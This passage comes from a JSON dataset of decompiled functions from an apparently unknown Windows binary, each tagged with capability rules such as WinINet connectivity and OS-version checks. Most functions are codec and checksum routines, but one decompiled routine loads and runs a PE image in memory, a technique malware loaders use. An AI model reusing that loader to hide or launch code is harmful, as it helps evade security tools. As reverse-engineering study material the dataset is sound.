        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004330c0(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    // switch table (5 cases) at 0x4330eb\n    switch(in_EAX[5]) {\n    case 200:\n        (**(in_EAX[0x6d] + 4))();\n        (**(in_EAX[6] + 8))();\n        in_EAX[5] = 0xc9;\n    case 0xc9:\n        iVar2 = (**in_EAX[0x6d])();\n        if (iVar2 == 1) {\n            fcn.00432e6c();\n            in_EAX[5] = 0xca;\n        }\n        break;\n    case 0xca:\n        iVar2 = 1;\n        break;\n    case 0xcb:\n    case 0xcc:\n    case 0xcd:\n    case 0xce:\n    case 0xcf:\n    case 0xd0:\n    case 0xd2:\n        iVar2 = (**in_EAX[0x6d])();\n        break;\n    default:\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    return iVar2;\n}\n",
        "token_count": 316
    },
    "00433620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433620(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    if (in_EDX != 1) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = in_EDX;\n        (***in_EAX)();\n    }\n    puVar3 = fcn.00433298();\n    *puVar3 = 0;\n    puVar3[1] = arg_ch;\n    puVar3[2] = arg_10h;\n    puVar3[3] = arg_8h;\n    puVar3[8] = in_ECX;\n    puVar3[10] = 0;\n    puVar3[0xb] = *(iVar1 + 0x44);\n    *(iVar1 + 0x44) = puVar3;\n    return;\n}\n",
        "token_count": 266
    },
    "00433688": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00433688(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    if (in_EDX != 1) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = in_EDX;\n        (***in_EAX)();\n    }\n    puVar3 = fcn.00433298();\n    *puVar3 = 0;\n    puVar3[1] = arg_ch;\n    puVar3[2] = arg_10h;\n    puVar3[3] = arg_8h;\n    puVar3[8] = in_ECX;\n    puVar3[10] = 0;\n    puVar3[0xb] = *(iVar1 + 0x48);\n    *(iVar1 + 0x48) = puVar3;\n    return;\n}\n",
        "token_count": 266
    },
    "004340b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004340b0(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    \n    if (in_EAX[0x52] == 1) {\n        iVar2 = in_EAX[0x53];\n        in_EAX[0x57] = *(iVar2 + 0x1c);\n        in_EAX[0x58] = *(iVar2 + 0x20);\n        *(iVar2 + 0x34) = 1;\n        *(iVar2 + 0x38) = 1;\n        *(iVar2 + 0x3c) = 1;\n        *(iVar2 + 0x40) = *(iVar2 + 0x24);\n        *(iVar2 + 0x44) = 1;\n        uVar3 = *(iVar2 + 0x20) % *(iVar2 + 0xc);\n        if (uVar3 == 0) {\n            uVar3 = *(iVar2 + 0xc);\n        }\n        *(iVar2 + 0x48) = uVar3;\n        in_EAX[0x59] = 1;\n        in_EAX[0x5a] = 0;\n    }\n    else {\n        if ((in_EAX[0x52] < 1) || (4 < in_EAX[0x52])) {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x1a;\n            *(iVar2 + 0x18) = in_EAX[0x52];\n            *(iVar2 + 0x1c) = 4;\n            (***in_EAX)(param_1);\n        }\n        iVar2 = fcn.0043e4b8();\n        in_EAX[0x57] = iVar2;\n        iVar2 = fcn.0043e4b8();\n        in_EAX[0x58] = iVar2;\n        in_EAX[0x59] = 0;\n        piVar5 = in_EAX + 0x53;\n        for (iVar2 = 0; iVar2 < in_EAX[0x52]; iVar2 = iVar2 + 1) {\n            iVar4 = *piVar5;\n            *(iVar4 + 0x34) = *(iVar4 + 8);\n            *(iVar4 + 0x38) = *(iVar4 + 0xc);\n            *(iVar4 + 0x3c) = *(iVar4 + 0x34) * *(iVar4 + 0xc);\n            *(iVar4 + 0x40) = *(iVar4 + 0x34) * *(iVar4 + 0x24);\n            uVar3 = *(iVar4 + 0x1c) % *(iVar4 + 0x34);\n            if (uVar3 == 0) {\n                uVar3 = *(iVar4 + 0x34);\n            }\n            *(iVar4 + 0x44) = uVar3;\n            uVar3 = *(iVar4 + 0x20) % *(iVar4 + 0x38);\n            if (uVar3 == 0) {\n                uVar3 = *(iVar4 + 0x38);\n            }\n            *(iVar4 + 0x48) = uVar3;\n            iVar4 = *(iVar4 + 0x3c);\n            if (10 < in_EAX[0x59] + iVar4) {\n                *(*in_EAX + 0x14) = 0xd;\n                (***in_EAX)();\n            }\n            while( true ) {\n                if (iVar4 < 1) break;\n                iVar1 = in_EAX[0x59];\n                in_EAX[0x59] = in_EAX[0x59] + 1;\n                in_EAX[iVar1 + 0x5a] = iVar2;\n                iVar4 = iVar4 + -1;\n            }\n            piVar5 = piVar5 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 913
    },
    "00439ab8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00439ab8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    iVar1 = *(in_EAX + 0x1ac);\n    if (*(in_EAX + 0x148) < 2) {\n        uVar2 = *(in_EAX + 0x140) - 1;\n        if (uVar2 < *(in_EAX + 0x94) || uVar2 == *(in_EAX + 0x94)) {\n            *(iVar1 + 0x1c) = *(*(in_EAX + 0x14c) + 0x48);\n        }\n        else {\n            *(iVar1 + 0x1c) = *(*(in_EAX + 0x14c) + 0xc);\n        }\n    }\n    else {\n        *(iVar1 + 0x1c) = 1;\n    }\n    *(iVar1 + 0x14) = 0;\n    *(iVar1 + 0x18) = 0;\n    return;\n}\n",
        "token_count": 240
    },
    "0043b240": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043b240(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uint *in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *arg_8h;\n    uVar6 = *(*(in_EAX + 0x1c4) + 0x8c + *(in_EDX + 4));\n    uVar3 = *(*(in_EAX + 0x1c4) + 0x96 + *(in_EDX + 4));\n    var_18h = in_ECX;\n    for (var_14h = 0; var_14h < *(in_EAX + 0x138); var_14h = var_14h + uVar3) {\n        puVar7 = *var_18h;\n        puVar4 = *(iVar2 + var_14h * 4);\n        puVar8 = puVar4 + *(in_EAX + 0x70);\n        while (puVar4 < puVar8) {\n            uVar1 = *puVar7;\n            puVar7 = puVar7 + 1;\n            uVar5 = uVar6;\n            if (uVar6 != 0) {\n                do {\n                    *puVar4 = uVar1;\n                    puVar4 = puVar4 + 1;\n                    uVar5 = uVar5 - 1;\n                } while (0 < uVar5);\n            }\n        }\n        if (1 < uVar3) {\n            fcn.0043e4e0(*(in_EAX + 0x70), uVar3 - 1, var_14h + 1);\n        }\n        var_18h = var_18h + 1;\n    }\n    return;\n}\n",
        "token_count": 491
    },
    "0043ea78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ea78(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    if (in_EAX[5] != 100) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x14;\n        *(iVar3 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    in_EAX[0xf] = param_2;\n    in_EAX[0x33] = 0;\n    in_EAX[0x36] = 0;\n    // switch table (6 cases) at 0x43eabc\n    switch(param_2) {\n    case 0:\n        in_EAX[0xe] = in_EAX[9];\n        if ((in_EAX[0xe] < 1) || (10 < in_EAX[0xe])) {\n            iVar3 = *in_EAX;\n            *(iVar3 + 0x14) = 0x1a;\n            *(iVar3 + 0x18) = in_EAX[0xe];\n            *(iVar3 + 0x1c) = 10;\n            (***in_EAX)();\n        }\n        for (iVar3 = 0; iVar3 < in_EAX[0xe]; iVar3 = iVar3 + 1) {\n            piVar2 = iVar3 * 0x54 + in_EAX[0x10];\n            *piVar2 = iVar3;\n            piVar2[2] = 1;\n            piVar2[3] = 1;\n            piVar2[4] = 0;\n            piVar2[5] = 0;\n            piVar2[6] = 0;\n        }\n        return;\n    case 1:\n        in_EAX[0x33] = 1;\n        in_EAX[0xe] = 1;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 1;\n        puVar1[2] = 1;\n        puVar1[3] = 1;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        return;\n    case 2:\n        in_EAX[0x36] = 1;\n        in_EAX[0xe] = 3;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 0x52;\n        puVar1[2] = 1;\n        puVar1[3] = 1;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0x54) = 0x47;\n        *(iVar3 + 0x5c) = 1;\n        *(iVar3 + 0x60) = 1;\n        *(iVar3 + 100) = 0;\n        *(iVar3 + 0x68) = 0;\n        *(iVar3 + 0x6c) = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xa8) = 0x42;\n        *(iVar3 + 0xb0) = 1;\n        *(iVar3 + 0xb4) = 1;\n        *(iVar3 + 0xb8) = 0;\n        *(iVar3 + 0xbc) = 0;\n        *(iVar3 + 0xc0) = 0;\n        return;\n    case 3:\n        in_EAX[0x33] = 1;\n        in_EAX[0xe] = 3;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 1;\n        puVar1[2] = 2;\n        puVar1[3] = 2;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0x54) = 2;\n        *(iVar3 + 0x5c) = 1;\n        *(iVar3 + 0x60) = 1;\n        *(iVar3 + 100) = 1;\n        *(iVar3 + 0x68) = 1;\n        *(iVar3 + 0x6c) = 1;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xa8) = 3;\n        *(iVar3 + 0xb0) = 1;\n        *(iVar3 + 0xb4) = 1;\n        *(iVar3 + 0xb8) = 1;\n        *(iVar3 + 0xbc) = 1;\n        *(iVar3 + 0xc0) = 1;\n        return;\n    case 4:\n        in_EAX[0x36] = 1;\n        in_EAX[0xe] = 4;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 0x43;\n        puVar1[2] = 1;\n        puVar1[3] = 1;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0x54) = 0x4d;\n        *(iVar3 + 0x5c) = 1;\n        *(iVar3 + 0x60) = 1;\n        *(iVar3 + 100) = 0;\n        *(iVar3 + 0x68) = 0;\n        *(iVar3 + 0x6c) = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xa8) = 0x59;\n        *(iVar3 + 0xb0) = 1;\n        *(iVar3 + 0xb4) = 1;\n        *(iVar3 + 0xb8) = 0;\n        *(iVar3 + 0xbc) = 0;\n        *(iVar3 + 0xc0) = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xfc) = 0x4b;\n        *(iVar3 + 0x104) = 1;\n        *(iVar3 + 0x108) = 1;\n        *(iVar3 + 0x10c) = 0;\n        *(iVar3 + 0x110) = 0;\n        *(iVar3 + 0x114) = 0;\n        return;\n    case 5:\n        in_EAX[0x36] = 1;\n        in_EAX[0xe] = 4;\n        puVar1 = in_EAX[0x10];\n        *puVar1 = 1;\n        puVar1[2] = 2;\n        puVar1[3] = 2;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0x54) = 2;\n        *(iVar3 + 0x5c) = 1;\n        *(iVar3 + 0x60) = 1;\n        *(iVar3 + 100) = 1;\n        *(iVar3 + 0x68) = 1;\n        *(iVar3 + 0x6c) = 1;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xa8) = 3;\n        *(iVar3 + 0xb0) = 1;\n        *(iVar3 + 0xb4) = 1;\n        *(iVar3 + 0xb8) = 1;\n        *(iVar3 + 0xbc) = 1;\n        *(iVar3 + 0xc0) = 1;\n        iVar3 = in_EAX[0x10];\n        *(iVar3 + 0xfc) = 4;\n        *(iVar3 + 0x104) = 2;\n        *(iVar3 + 0x108) = 2;\n        *(iVar3 + 0x10c) = 0;\n        *(iVar3 + 0x110) = 0;\n        *(iVar3 + 0x114) = 0;\n        return;\n    default:\n        *(*in_EAX + 0x14) = 10;\n        (***in_EAX)();\n        return;\n    }\n}\n",
        "token_count": 1970
    },
    "0044055c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044055c(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    \n    if (in_EAX[0x3c] == 1) {\n        iVar2 = in_EAX[0x3d];\n        in_EAX[0x41] = *(iVar2 + 0x1c);\n        in_EAX[0x42] = *(iVar2 + 0x20);\n        *(iVar2 + 0x34) = 1;\n        *(iVar2 + 0x38) = 1;\n        *(iVar2 + 0x3c) = 1;\n        *(iVar2 + 0x40) = 8;\n        *(iVar2 + 0x44) = 1;\n        uVar3 = *(iVar2 + 0x20) % *(iVar2 + 0xc);\n        if (uVar3 == 0) {\n            uVar3 = *(iVar2 + 0xc);\n        }\n        *(iVar2 + 0x48) = uVar3;\n        in_EAX[0x43] = 1;\n        in_EAX[0x44] = 0;\n    }\n    else {\n        if ((in_EAX[0x3c] < 1) || (4 < in_EAX[0x3c])) {\n            iVar2 = *in_EAX;\n            *(iVar2 + 0x14) = 0x1a;\n            *(iVar2 + 0x18) = in_EAX[0x3c];\n            *(iVar2 + 0x1c) = 4;\n            (***in_EAX)(param_1);\n        }\n        iVar2 = fcn.0043e4b8();\n        in_EAX[0x41] = iVar2;\n        iVar2 = fcn.0043e4b8();\n        in_EAX[0x42] = iVar2;\n        in_EAX[0x43] = 0;\n        piVar5 = in_EAX + 0x3d;\n        for (iVar2 = 0; iVar2 < in_EAX[0x3c]; iVar2 = iVar2 + 1) {\n            iVar4 = *piVar5;\n            *(iVar4 + 0x34) = *(iVar4 + 8);\n            *(iVar4 + 0x38) = *(iVar4 + 0xc);\n            *(iVar4 + 0x3c) = *(iVar4 + 0x34) * *(iVar4 + 0xc);\n            *(iVar4 + 0x40) = *(iVar4 + 0x34) << 3;\n            uVar3 = *(iVar4 + 0x1c) % *(iVar4 + 0x34);\n            if (uVar3 == 0) {\n                uVar3 = *(iVar4 + 0x34);\n            }\n            *(iVar4 + 0x44) = uVar3;\n            uVar3 = *(iVar4 + 0x20) % *(iVar4 + 0x38);\n            if (uVar3 == 0) {\n                uVar3 = *(iVar4 + 0x38);\n            }\n            *(iVar4 + 0x48) = uVar3;\n            iVar4 = *(iVar4 + 0x3c);\n            if (10 < in_EAX[0x43] + iVar4) {\n                *(*in_EAX + 0x14) = 0xd;\n                (***in_EAX)();\n            }\n            while( true ) {\n                if (iVar4 < 1) break;\n                iVar1 = in_EAX[0x43];\n                in_EAX[0x43] = in_EAX[0x43] + 1;\n                in_EAX[iVar1 + 0x44] = iVar2;\n                iVar4 = iVar4 + -1;\n            }\n            piVar5 = piVar5 + 1;\n        }\n    }\n    if (0 < in_EAX[0x32]) {\n        iVar2 = in_EAX[0x32] * in_EAX[0x41];\n        if (0xfffe < iVar2) {\n            iVar2 = 0xffff;\n        }\n        in_EAX[0x31] = iVar2;\n    }\n    return;\n}\n",
        "token_count": 977
    },
    "00441088": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00441088(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    iVar1 = *(in_EAX + 0x154);\n    if (*(in_EAX + 0xf0) < 2) {\n        uVar2 = *(in_EAX + 0xec) - 1;\n        if (uVar2 < *(iVar1 + 8) || uVar2 == *(iVar1 + 8)) {\n            *(iVar1 + 0x14) = *(*(in_EAX + 0xf4) + 0x48);\n        }\n        else {\n            *(iVar1 + 0x14) = *(*(in_EAX + 0xf4) + 0xc);\n        }\n    }\n    else {\n        *(iVar1 + 0x14) = 1;\n    }\n    *(iVar1 + 0xc) = 0;\n    *(iVar1 + 0x10) = 0;\n    return;\n}\n",
        "token_count": 225
    },
    "00441cc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00441cc8(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    puVar2 = (**in_EAX[1])();\n    in_EAX[0x57] = puVar2;\n    *puVar2 = 0x441cc4;\n    iVar1 = in_EAX[10];\n    uVar3 = iVar1 - 1;\n    if (uVar3 == 0) {\n        if (in_EAX[9] != 1) {\n            *(*in_EAX + 0x14) = 9;\n            uVar3 = (***in_EAX)();\n        }\n    }\n    else {\n        uVar3 = iVar1 - 4;\n        if (iVar1 - 2U < 2) {\n            if (in_EAX[9] != 3) {\n                *(*in_EAX + 0x14) = 9;\n                uVar3 = (***in_EAX)();\n            }\n        }\n        else {\n            bVar4 = uVar3 < 2;\n            uVar3 = iVar1 - 6;\n            if (bVar4) {\n                if (in_EAX[9] != 4) {\n                    *(*in_EAX + 0x14) = 9;\n                    uVar3 = (***in_EAX)();\n                }\n            }\n            else if (in_EAX[9] < 1) {\n                *(*in_EAX + 0x14) = 9;\n                uVar3 = (***in_EAX)();\n            }\n        }\n    }\n    // switch table (6 cases) at 0x441d6b\n    switch(in_EAX[0xf]) {\n    default:\n        if ((in_EAX[0xf] != in_EAX[10]) || (uVar3 = in_EAX[0xe],  uVar3 != in_EAX[9])) {\n            *(*in_EAX + 0x14) = 0x1b;\n            uVar3 = (***in_EAX)();\n        }\n        puVar2[1] = fcn.00441c50;\n        return uVar3;\n    case 1:\n        break;\n    case 2:\n        if (in_EAX[0xe] != 3) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n        if (in_EAX[10] == 2) {\n            puVar2[1] = fcn.00441c50;\n            return uVar3;\n        }\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n        return uVar3;\n    case 3:\n        if (in_EAX[0xe] != 3) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n        if (in_EAX[10] == 2) {\n            *puVar2 = 0x44188c;\n            puVar2[1] = fcn.0044192c;\n            return uVar3;\n        }\n        if (in_EAX[10] == 3) {\n            puVar2[1] = fcn.00441c50;\n            return uVar3;\n        }\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n        return uVar3;\n    case 4:\n        if (in_EAX[0xe] != 4) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n        if (in_EAX[10] == 4) {\n            puVar2[1] = fcn.00441c50;\n            return uVar3;\n        }\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n        return uVar3;\n    case 5:\n        if (in_EAX[0xe] != 4) {\n            *(*in_EAX + 0x14) = 10;\n            uVar3 = (***in_EAX)();\n        }\n        if (in_EAX[10] == 4) {\n            *puVar2 = 0x44188c;\n            puVar2[1] = fcn.00441ac0;\n            return uVar3;\n        }\n        if (in_EAX[10] == 5) {\n            puVar2[1] = fcn.00441c50;\n            return uVar3;\n        }\n        *(*in_EAX + 0x14) = 0x1b;\n        uVar3 = (***in_EAX)();\n        return uVar3;\n    }\n    if (in_EAX[0xe] != 1) {\n        *(*in_EAX + 0x14) = 10;\n        uVar3 = (***in_EAX)();\n    }\n    if (in_EAX[10] == 1) {\n        puVar2[1] = fcn.00441c04;\n        return uVar3;\n    }\n    if (in_EAX[10] == 2) {\n        *puVar2 = 0x44188c;\n        puVar2[1] = fcn.00441a34;\n        return uVar3;\n    }\n    if (in_EAX[10] == 3) {\n        puVar2[1] = fcn.00441c04;\n        return uVar3;\n    }\n    *(*in_EAX + 0x14) = 0x1b;\n    uVar3 = (***in_EAX)();\n    return uVar3;\n}\n",
        "token_count": 1292
    },
    "00445228": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.00445228(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *arg_8h;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t *in_stack_fffffe7c;\n    int32_t *piStack348;\n    uint uStack344;\n    uchar *puStack340;\n    int32_t var_140h;\n    uint32_t lpAddress;\n    uint dwSize;\n    uint var_ech;\n    uint var_48h;\n    int32_t *var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack340 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack344 = 0x4454a3;\n    piStack348 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack348;\n    fcn.00408460();\n    if (var_48h == 0x5a4d) {\n        piVar6 = var_ch;\n        fcn.00444ad0(var_ch, var_ch >> 0x1f);\n        fcn.00408460();\n        if (var_140h == 0x4550) {\n            uVar2 = sub.kernel32.dll_VirtualAlloc_1(lpAddress, dwSize, 0x2000, 4);\n            if (uVar2 == 0) {\n                in_stack_fffffe7c = NULL;\n                uVar2 = sub.kernel32.dll_VirtualAlloc_1(0, dwSize, 0x2000, 4);\n            }\n            if (uVar2 == 0) {\n                fcn.004054c0();\n                *in_FS_OFFSET = in_stack_fffffe7c;\n            }\n            else {\n                uVar3 = sub.kernel32.dll_GetProcessHeap(0, 0x11);\n                arg_8h = sub.kernel32.dll_HeapAlloc(uVar3);\n                arg_8h[1] = uVar2;\n                arg_8h[3] = 0;\n                arg_8h[2] = 0;\n                *(arg_8h + 4) = 0;\n                sub.kernel32.dll_VirtualAlloc_1(uVar2, dwSize, 0x1000, 4);\n                iVar4 = sub.kernel32.dll_VirtualAlloc_1(uVar2, var_ech, 0x1000, 4);\n                fcn.00408460();\n                *arg_8h = var_ch + iVar4;\n                *(var_ch + iVar4 + 0x34) = uVar2;\n                fcn.00444bc4();\n                piVar6 = uVar2 - lpAddress;\n                piVar7 = piVar6;\n                piVar8 = -(uVar2 < lpAddress);\n                if (piVar6 != NULL) {\n                    piVar7 = arg_8h;\n                    fcn.00444cc8(arg_8h, piVar6);\n                    piVar8 = piVar6;\n                }\n                piVar6 = arg_8h;\n                cVar1 = fcn.00444db4(arg_8h);\n                if (cVar1 == '\\0') {\n                    fcn.00405738(piVar6, piVar7, piVar8);\n                    fcn.00445854();\n                    *in_FS_OFFSET = piVar6;\n                }\n                else {\n                    piVar6 = arg_8h;\n                    fcn.00445110(arg_8h);\n                    if (*(*arg_8h + 0x28) != 0) {\n                        pcVar5 = *(*arg_8h + 0x28) + uVar2;\n                        if (pcVar5 == NULL) {\n                            fcn.004054c0();\n                            fcn.00445854();\n                            *in_FS_OFFSET = piVar6;\n                            return NULL;\n                        }\n                        iVar4 = (*pcVar5)(uVar2, 1, 0);\n                        if (iVar4 == 0) {\n                            fcn.004054c0();\n                            fcn.00445854();\n                            *in_FS_OFFSET = piVar6;\n                            return NULL;\n                        }\n                        *(arg_8h + 4) = 1;\n                    }\n                    *in_FS_OFFSET = piVar6;\n                    var_4h = arg_8h;\n                }\n            }\n        }\n        else {\n            fcn.004054c0();\n            *in_FS_OFFSET = piVar6;\n        }\n    }\n    else {\n        fcn.004054c0();\n        *in_FS_OFFSET = piStack348;\n    }\n    return var_4h;\n}\n",
        "token_count": 1071
    },
    "0044686c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044686c(uint32_t param_1, uint8_t *param_2)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    \n    uVar18 = in_EAX >> 0x10;\n    uVar2 = in_EAX & 0xffff;\n    if (param_1 == 1) {\n        uVar2 = uVar2 + *param_2;\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar18 = uVar18 + uVar2;\n        if (0xfff0 < uVar18) {\n            uVar18 = uVar18 - 0xfff1;\n        }\n        uVar2 = uVar18 << 0x10 | uVar2;\n    }\n    else if (param_2 == NULL) {\n        uVar2 = 1;\n    }\n    else if (param_1 < 0x10) {\n        while (param_1 != 0) {\n            uVar2 = uVar2 + *param_2;\n            param_2 = param_2 + 1;\n            uVar18 = uVar18 + uVar2;\n            param_1 = param_1 - 1;\n        }\n        if (0xfff0 < uVar2) {\n            uVar2 = uVar2 - 0xfff1;\n        }\n        uVar2 = uVar18 % 0xfff1 << 0x10 | uVar2;\n    }\n    else {\n        if (0x15af < param_1) {\n            do {\n                param_1 = param_1 - 0x15b0;\n                iVar1 = 0x15b;\n                do {\n                    iVar3 = uVar2 + *param_2;\n                    iVar4 = iVar3 + param_2[1];\n                    iVar5 = iVar4 + param_2[2];\n                    iVar6 = iVar5 + param_2[3];\n                    iVar7 = iVar6 + param_2[4];\n                    iVar8 = iVar7 + param_2[5];\n                    iVar9 = iVar8 + param_2[6];\n                    iVar10 = iVar9 + param_2[7];\n                    iVar11 = iVar10 + param_2[8];\n                    iVar12 = iVar11 + param_2[9];\n                    iVar13 = iVar12 + param_2[10];\n                    iVar14 = iVar13 + param_2[0xb];\n                    iVar15 = iVar14 + param_2[0xc];\n                    iVar16 = iVar15 + param_2[0xd];\n                    iVar17 = iVar16 + param_2[0xe];\n                    uVar2 = iVar17 + param_2[0xf];\n                    uVar18 = uVar18 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                             iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;\n                    param_2 = param_2 + 0x10;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n                uVar2 = uVar2 % 0xfff1;\n                uVar18 = uVar18 % 